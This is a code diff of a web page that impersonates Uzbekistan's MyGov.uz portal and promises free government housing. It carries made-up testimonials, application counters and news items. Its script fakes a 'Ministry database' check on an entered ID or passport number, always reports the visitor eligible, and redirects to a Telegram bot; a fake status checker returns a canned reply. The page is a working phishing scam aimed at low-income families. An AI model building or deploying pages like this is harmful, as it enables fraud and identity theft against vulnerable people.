@@ -2,182 +2,17 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MyGov.uz — Государственная цифровая платформа</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --primary: #28a745;
-      --secondary: #ffffff;
-      --accent: #218838;
-      --text: #212529;
-      --muted: #6c757d;
-      --shadow: rgba(0, 0, 0, 0.1);
-    }
-
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Inter', sans-serif;
-      background-color: var(--secondary);
-      color: var(--text);
-      line-height: 1.6;
-    }
-
-    header {
-      background-color: var(--primary);
-      color: white;
-      padding: 24px 0;
-      text-align: center;
-      box-shadow: 0 2px 8px var(--shadow);
-    }
-
-    .language-switch {
-      text-align: right;
-      background: #f8f9fa;
-      padding: 10px 20px;
-    }
-
-    .language-switch button {
-      background: none;
-      border: none;
-      font-weight: bold;
-      color: var(--primary);
-      font-size: 16px;
-      margin-left: 10px;
-      cursor: pointer;
-    }
-
-    nav {
-      background-color: #f1f1f1;
-      box-shadow: 0 2px 6px var(--shadow);
-    }
-
-    nav ul {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      list-style: none;
-      gap: 14px;
-      padding: 14px;
-    }
-
-    nav a {
-      background-color: var(--primary);
-      color: white;
-      padding: 8px 20px;
-      border-radius: 25px;
-      text-decoration: none;
-      font-weight: 600;
-      transition: background 0.3s ease;
-      box-shadow: 0 2px 6px var(--shadow);
-    }
-
-    nav a:hover {
-      background-color: var(--accent);
-    }
-
-    .main-image {
-      width: 100%;
-      max-height: 400px;
-      object-fit: cover;
-      border-bottom: 3px solid var(--primary);
-    }
-
-    .container {
-      max-width: 960px;
-      margin: 40px auto;
-      padding: 24px;
-    }
-
-    section {
-      background: #ffffff;
-      border-radius: 16px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08), 0 4px 12px rgba(0, 0, 0, 0.12);
-      padding: 32px;
-      margin-bottom: 36px;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    section:hover {
-      transform: translateY(-4px);
-      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15), 0 10px 32px rgba(0, 0, 0, 0.08);
-    }
-
-    .cta button {
-      background-color: var(--primary);
-      color: white;
-      padding: 14px 32px;
-      font-size: 18px;
-      font-weight: 600;
-      border-radius: 8px;
-      border: none;
-      cursor: pointer;
-      box-shadow: 0 4px 12px var(--shadow);
-      transition: background-color 0.3s, transform 0.2s ease;
-    }
-
-    .cta button:hover {
-      background-color: var(--accent);
-      transform: scale(1.03);
-    }
-
-    img {
-      max-width: 100%;
-      border-radius: 8px;
-      box-shadow: 0 2px 6px var(--shadow);
-    }
-
-    @media (max-width: 600px) {
-      nav ul {
-        flex-direction: column;
-        gap: 8px;
-      }
-
-      .cta button {
-        width: 100%;
-        /* Стили для кнопки */
-.cta button {
-  background: linear-gradient(to right, #28a745, #218838);
-  color: white;
-  padding: 14px 32px;
-  font-size: 18px;
-  font-weight: 600;
-  border-radius: 50px;
-  border: none;
-  cursor: pointer;
-  box-shadow: 0 4px 14px rgba(0, 0, 0, 0.15);
-  transition: all 0.3s ease;
-  position: relative;
-  overflow: hidden;
-}
-
-.cta button:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.2);
-}
-
-/* Спиннер загрузки */
-.loader {
-  border: 3px solid #eee;
-  border-top: 3px solid #28a745;
-  border-radius: 50%;
-  width: 24px;
-  height: 24px;
-  animation: spin 1s linear infinite;
-  margin: 12px auto;
-}
-
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-
-      }
+    body { font-family: 'Inter', sans-serif; }
+    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes fadeInUp {
+      0% { opacity: 0; transform: translateY(10px); }
+      100% { opacity: 1; transform: translateY(0); }
     }
   </style>
   <!-- Meta Pixel Code -->
@@ -198,214 +33,154 @@ src="https://www.facebook.com/tr?id=713550937996335&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
 </head>
-<body>
-
-  <div class="language-switch">
-    <span>Язык / Til:</span>
-    <button onclick="setLanguage('ru')">🇷🇺 RU</button>
-    <button onclick="setLanguage('uz')">🇺🇿 UZ</button>
-  </div>
-
-  <header>
-    <h1>MyGov.uz — Государственная цифровая платформа</h1>
+<body class="bg-gray-50 text-gray-800">
+  <header class="bg-white shadow sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
+      <div class="text-xl font-bold text-blue-800">MyGov.uz</div>
+      <nav class="hidden md:flex space-x-6">
+        <a href="#program" class="text-blue-700 hover:text-blue-900 font-medium">О программе</a>
+        <a href="#check" class="text-blue-700 hover:text-blue-900 font-medium">Проверить право</a>
+        <a href="#faq" class="text-blue-700 hover:text-blue-900 font-medium">Вопросы</a>
+        <a href="#contact" class="text-blue-700 hover:text-blue-900 font-medium">Контакты</a>
+      </nav>
+    </div>
   </header>
 
-  <nav>
-    <ul>
-      <li><a href="#about">О программе</a></li>
-      <li><a href="#why">Надёжность</a></li>
-      <li><a href="#faq">FAQ</a></li>
-      <li><a href="#reviews">Отзывы</a></li>
-      <li><a href="#news">Новости</a></li>
-      <li><a href="#contact">Контакты</a></li>
-    </ul>
-  </nav>
+  <section class="text-center py-20 bg-gradient-to-r from-blue-900 to-blue-700 text-white animate-fade-in">
+    <h1 class="text-4xl md:text-5xl font-bold mb-6 animate-pulse">Государственная программа по обеспечению жильём</h1>
+    <p class="text-lg md:text-xl mb-6">Проверьте своё право на бесплатную квартиру онлайн</p>
+    <a href="#check" class="inline-block bg-white text-blue-800 px-6 py-3 rounded-full font-semibold shadow hover:bg-blue-100 transition">Проверить право</a>
+  </section>
 
-  <main class="container">
+  <section id="program" class="py-16 bg-white">
+    <div class="max-w-4xl mx-auto text-center px-4 animate-[fadeInUp_1s_ease-out]">
+      <h2 class="text-3xl font-bold text-blue-900 mb-4">О программе</h2>
+      <p class="text-lg text-gray-700 mb-6">Платформа MyGov.uz — это официальный цифровой портал Узбекистана, созданный для упрощения получения социальных льгот, включая доступ к государственной программе бесплатного жилья.</p>
+      <div class="rounded-xl overflow-hidden shadow-lg mx-auto" style="max-width: 720px">
+        <img src="логотип.png" alt="Фотография программы" class="w-full object-cover" />
+      </div>
+    </div>
+  </section>
 
-        <!-- Русская версия -->
-        <div id="lang-ru">
-          <section>
-            <div style="background-color: #d4edda; color: #155724; padding: 12px; text-align: center;">
-              ✅ Уже 3 412 семей подали заявки через платформу сегодня
-            </div>
-          </section>
-    
-          <section id="about">
-            <h2>Бесплатное жильё от государства — это реально</h2>
-            <img src="2025-04-23 23.47.14.jpg" alt="Жильё от государства" class="main-image" />
-            <p>Программа поддержки нуждающихся граждан Узбекистана уже действует. Проверьте своё право и получите ключи от новой квартиры с помощью цифровой платформы MyGov.uz.</p>
-            <ul>
-              <li>✅ Проверка занимает не более 2 минут</li>
-              <li>✅ Тысячи семей уже получили жильё</li>
-              <li>✅ Без очередей и взяток</li>
-            </ul>
-            <div class="cta">
-              <button onclick="openModal()">Проверить своё право на жильё</button>
-              <p style="margin-top: 10px; font-size: 14px; color: var(--muted);">Не требует регистрации</p>
-            </div>
-          </section>
-    
-          <section id="why">
-            <h2>Почему это безопасно и надёжно?</h2>
-            <ul>
-              <li>📌 Программа одобрена правительством</li>
-              <li>👨‍👩‍👧‍👦 Поддержка многодетных и малообеспеченных семей</li>
-              <li>🛡️ Гарантированная конфиденциальность</li>
-              <li>📍 Доступно по всей территории Узбекистана</li>
-            </ul>
-          </section>
-    
-          <section id="faq">
-            <h2>Часто задаваемые вопросы</h2>
-            <h3>Кто может получить жильё?</h3>
-            <p>Граждане, находящиеся в списках нуждающихся, зарегистрированные по месту жительства в Узбекистане.</p>
-            <h3>Это официальная программа?</h3>
-            <p>Да, на базе инициатив государственной цифровизации и поддержки населения.</p>
-            <h3>Это бесплатно?</h3>
-            <p>Да, проверка и подача заявки полностью бесплатны.</p>
-          </section>
-    
-          <section id="reviews">
-            <h2>Отзывы участников</h2>
-            <p><em>"Получила квартиру в Ташкенте, спасибо MyGov.uz! Всё прошло быстро и без лишней бюрократии." — Гулистан М., Самарканд</em></p>
-            <p><em>"Долго не верил, но всё реально! Документы подал онлайн, через неделю уже получил одобрение." — Тимур Б., Андижан</em></p>
-          </section>
-    
-          <section id="news">
-            <h2>Последние новости</h2>
-            <ul>
-              <li>🗓️ 20 апреля 2025 — Более 10,000 семей получили квартиры по программе.</li>
-              <li>🗓️ 10 апреля 2025 — Запущена мобильная версия платформы.</li>
-            </ul>
-          </section>
-    
-          <section id="contact">
-            <h2>Контактная информация</h2>
-            <p>📧 Email: <strong>support@mygov.uz</strong></p>
-            <p>💬 Telegram-бот: <a href="https://t.me/MyGovUzRasmiy_bot">@MyGovUzRasmiy_bot</a></p>
-          </section>
+  <section id="check" class="py-16 bg-blue-50">
+    <div class="max-w-xl mx-auto text-center px-4 animate-[fadeInUp_1s_ease-out]">
+      <h2 class="text-2xl font-semibold text-blue-800 mb-4">Проверка права на жильё</h2>
+      <input id="iin" type="text" placeholder="Введите ИИН или паспорт" class="w-full border px-4 py-3 rounded-xl mb-4 shadow" />
+      <button onclick="checkIIN()" class="w-full bg-blue-700 text-white py-3 rounded-xl font-medium hover:bg-blue-800 transition">Проверить</button>
+      <div id="iin-loader" class="text-center mt-4 hidden">
+        <div class="w-12 h-12 border-4 border-blue-100 border-t-blue-700 rounded-full animate-spin mx-auto"></div>
+        <p class="text-sm text-blue-800 mt-3 font-semibold">Подключение к базе Министерства…</p>
+      </div>
+      <div id="iin-result" class="text-center mt-4 hidden text-green-700 font-semibold text-lg"></div>
+      <button onclick="openFaqModal('modal-status')" class="w-full mt-6 bg-green-600 text-white py-3 rounded-xl font-medium hover:bg-green-700 transition">📄 Проверить статус заявки</button>
+    </div>
+  </section>
+
+  <section id="faq" class="py-16 bg-white">
+    <div class="max-w-4xl mx-auto px-4 animate-[fadeInUp_1s_ease-out]">
+      <h2 class="text-2xl font-bold text-blue-900 mb-6 text-center">Часто задаваемые вопросы</h2>
+      <div class="space-y-6">
+        <div class="bg-gray-100 p-5 rounded-xl shadow transition-transform hover:scale-[1.02]">
+          <h3 class="font-semibold text-blue-800">Кто может подать заявку?</h3>
+          <p class="text-gray-600">Граждане, признанные нуждающимися, зарегистрированные в Узбекистане.</p>
         </div>
-    
-        <!-- Узбекская версия -->
-        <div id="lang-uz" style="display:none;">
-          <section>
-            <div style="background-color: #d4edda; color: #155724; padding: 12px; text-align: center;">
-              ✅ Bugun platforma orqali 3 412 ta oila ariza topshirdi
-            </div>
-          </section>
-    
-          <section id="about">
-            <h2>Davlat tomonidan bepul uy olish — bu haqiqat</h2>
-            <img src="2025-04-23 23.47.14.jpg" alt="Davlat uyi" class="main-image" />
-            <p>MyGov.uz platformasi ehtiyojmand fuqarolarga bepul uy olishda yordam beradi. Ariza berish uchun atigi 2 daqiqa kerak bo‘ladi.</p>
-            <ul>
-              <li>✅ Tez va oson tekshiruv</li>
-              <li>✅ Minglab oilalar allaqachon uy oldi</li>
-              <li>✅ Navbatsiz va korrupsiyasiz</li>
-            </ul>
-            <div class="cta">
-              <button onclick="openModal()">Uy olish huquqini tekshirish</button>
-              <p style="margin-top: 10px; font-size: 14px; color: var(--muted);">Ro‘yxatdan o‘tish shart emas</p>
-            </div>
-          </section>
-    
-          <section id="why">
-            <h2>Nega bu xavfsiz?</h2>
-            <ul>
-              <li>📌 Davlat dasturi asosida</li>
-              <li>👨‍👩‍👧‍👦 Ko‘p farzandli va kam ta'minlangan oilalar uchun</li>
-              <li>🛡️ Maxfiylik kafolatlangan</li>
-              <li>📍 Butun O‘zbekiston bo‘ylab mavjud</li>
-            </ul>
-          </section>
-    
-          <section id="faq">
-            <h2>Ko‘p so‘raladigan savollar</h2>
-            <h3>Kimlar uy olish huquqiga ega?</h3>
-            <p>Uy-joyga muhtoj deb tan olingan, O‘zbekiston fuqarolari.</p>
-            <h3>Bu rasmiy dasturmi?</h3>
-            <p>Ha, davlat raqamlashtirish va ijtimoiy qo‘llab-quvvatlash tashabbuslari asosida.</p>
-            <h3>Bu bepulmi?</h3>
-            <p>Ha, tekshiruv va ariza topshirish butunlay bepul.</p>
-          </section>
-    
-          <section id="reviews">
-            <h2>Foydalanuvchi fikrlari</h2>
-            <p><em>"Toshkentdan uy oldim, rahmat MyGov.uz! Hammasi tez va byurokratiyasiz bo‘ldi." — Guliston M., Samarqand</em></p>
-            <p><em>"Ishonmagan edim, lekin rostdan ham oson ekan. Onlayn ariza, bir haftada tasdiq." — Timur B., Andijon</em></p>
-          </section>
-    
-          <section id="news">
-            <h2>So‘nggi yangiliklar</h2>
-            <ul>
-              <li>🗓️ 2025 yil 20 aprel — 10 mingdan ortiq oila uy bilan ta'minlandi.</li>
-              <li>🗓️ 2025 yil 10 aprel — Mobil ilova ishga tushirildi.</li>
-            </ul>
-          </section>
-    
-          <section id="contact">
-            <h2>Aloqa ma'lumotlari</h2>
-            <p>📞 Telefon: <strong>+998 (71) 123-45-67</strong></p>
-            <p>📧 Email: <strong>support@mygov.uz</strong></p>
-            <p>💬 Telegram-bot: <a href="https://t.me/your_bot">@your_bot</a></p>
-          </section>
+        <div class="bg-gray-100 p-5 rounded-xl shadow transition-transform hover:scale-[1.02]">
+          <h3 class="font-semibold text-blue-800">Это бесплатно?</h3>
+          <p class="text-gray-600">Да. Подача заявки и проверка права полностью бесплатны.</p>
         </div>
-  </main>
+        <div class="bg-gray-100 p-5 rounded-xl shadow transition-transform hover:scale-[1.02]">
+          <h3 class="font-semibold text-blue-800">Что потребуется?</h3>
+          <p class="text-gray-600">Только ваш ИИН. При одобрении потребуется подтвердить личность.</p>
+        </div>
+      </div>
+    </div>
+  </section>
 
-  <footer>
-    <p>© 2025 MyGov.uz · Все права защищены / Barcha huquqlar himoyalangan</p>
-    <p><a href="https://t.me/your_bot" style="color: var(--primary); text-decoration: underline;">Перейти в Telegram-бот</a></p>
+  <footer id="contact" class="bg-blue-900 text-white py-6">
+    <div class="max-w-7xl mx-auto text-center px-4">
+      <p class="text-sm">© 2025 MyGov.uz — Государственная цифровая платформа Республики Узбекистан</p>
+      <p class="mt-2 text-sm">Telegram: <a href="https://t.me/MyGovUzRasmiy_bot" class="underline">@MyGovUzRasmiy_bot</a></p>
+    </div>
   </footer>
 
-  <script>
-    function setLanguage(lang) {
-      document.getElementById('lang-ru').style.display = lang === 'ru' ? 'block' : 'none';
-      document.getElementById('lang-uz').style.display = lang === 'uz' ? 'block' : 'none';
-    }
-
-    function openModal() {
-    const modal = document.createElement('div');
-    modal.id = 'modal';
-    modal.style.cssText = `
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 9999;
-      animation: fadeIn 0.3s ease;
-    `;
-    modal.innerHTML = `
-      <div style="background: white; padding: 30px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.2); max-width: 400px; width: 100%; text-align: center;">
-        <h2 style="margin-bottom: 10px;">Введите ваш ИИН</h2>
-        <input type="text" id="iinInput" maxlength="14" placeholder="Например: 12345678901234" 
-          style="width: 100%; padding: 14px; margin-top: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px;">
-        <button onclick="startCheck()" id="startBtn" style="background-color: #28a745; color: white; padding: 12px 24px; font-size: 16px; border-radius: 30px; border: none; cursor: pointer;">🔍 Проверить</button>
-        <div id="loading" style="margin-top: 20px;"></div>
+  <!-- Модальное окно проверки статуса -->
+  <div id="modal-status" class="fixed inset-0 hidden items-center justify-center bg-black bg-opacity-50 z-50">
+    <div class="bg-white rounded-xl p-6 w-11/12 max-w-md relative animate-[fadeInUp_0.5s_ease-out]">
+      <button onclick="closeFaqModal('modal-status')" class="absolute top-2 right-3 text-xl">✖</button>
+      <h3 class="text-lg font-semibold text-blue-900 mb-2">Введите номер заявки</h3>
+      <input id="status-id" type="text" class="w-full border px-4 py-2 rounded mb-4" />
+      <button onclick="checkStatus()" class="w-full bg-green-600 text-white py-2 rounded font-semibold hover:bg-green-700">Проверить статус</button>
+      <div id="status-loader" class="text-center mt-4 hidden">
+        <div class="w-8 h-8 border-4 border-gray-300 border-t-green-500 rounded-full animate-spin mx-auto"></div>
+        <p class="text-sm text-gray-600 mt-2">Проверка заявки…</p>
       </div>
-    `;
-    document.body.appendChild(modal);
-  }
+      <div id="status-message" class="mt-4 text-center font-semibold hidden"></div>
+    </div>
+  </div>
 
-  function startCheck() {
-    const iin = document.getElementById('iinInput').value.trim();
-    const loadingDiv = document.getElementById('loading');
-    const button = document.getElementById('startBtn');
-
-    if (iin.length < 7) {
-      alert('Пожалуйста, введите корректный ИИН.');
-      return;
+  <script>
+    function openFaqModal(id) {
+      document.getElementById(id).classList.remove('hidden');
+      document.getElementById(id).classList.add('flex');
     }
 
-    button.disabled = true;
-    loadingDiv.innerHTML = '<div class="loader"></div><p style="color:#555; margin-top:8px;">Проверяем данные…</p>';
+    function closeFaqModal(id) {
+      document.getElementById(id).classList.remove('flex');
+      document.getElementById(id).classList.add('hidden');
+    }
 
-    setTimeout(() => {
-      loadingDiv.innerHTML = '<p style="color:green; font-weight:600;">✅ Проверка пройдена успешно!</p>';
+    function checkStatus() {
+      const id = document.getElementById("status-id").value.trim();
+      const loader = document.getElementById("status-loader");
+      const message = document.getElementById("status-message");
+
+      loader.classList.remove('hidden');
+      message.classList.add('hidden');
+      
+      if (!/^UZ-\d{5,}-\d{6,}$/.test(id)) {
+        loader.classList.add('hidden');
+        message.classList.remove('hidden');
+        message.classList.add('text-red-600');
+        message.innerText = "❌ Заявка не найдена.";
+        return;
+      }
+
+      let percent = 0;
+      const interval = setInterval(() => {
+        percent += Math.floor(Math.random() * 15) + 5;
+        if (percent >= 100) {
+          clearInterval(interval);
+          loader.classList.add('hidden');
+          message.classList.remove('hidden');
+          message.classList.remove('text-red-600');
+          message.classList.add('text-green-600');
+          message.innerText = "✅ Ваша заявка в обработке. Спасибо!";
+        }
+      }, 300);
+    }
+
+    function checkIIN() {
+      const input = document.getElementById("iin").value.trim();
+      const loader = document.getElementById("iin-loader");
+      const result = document.getElementById("iin-result");
+
+      if (input.length < 7) {
+        alert("Введите корректный ИИН");
+        return;
+      }
+
+      loader.classList.remove('hidden');
+      result.classList.add('hidden');
+
       setTimeout(() => {
-        window.location.href = "https://t.me/MyGovUzRasmiy_bot";
-      }, 1500);
-    }, 2000);
-  }
-</script>
-
+        loader.classList.add('hidden');
+        result.innerText = "✅ Вы имеете право на подачу заявки. Открытие Telegram-бота...";
+        result.classList.remove('hidden');
+        setTimeout(() => {
+          window.location.href = "https://t.me/MyGovUzRasmiy_bot";
+        }, 1000);
+      }, 4500);
+    }
+  </script>
 </body>
 </html>
-    
